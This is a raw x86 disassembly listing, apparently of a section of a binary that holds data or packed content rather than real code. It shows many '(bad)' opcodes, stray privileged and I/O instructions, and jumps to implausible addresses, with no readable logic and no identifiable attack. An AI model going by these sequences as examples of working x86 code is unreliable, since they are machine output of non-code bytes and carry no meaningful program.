  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
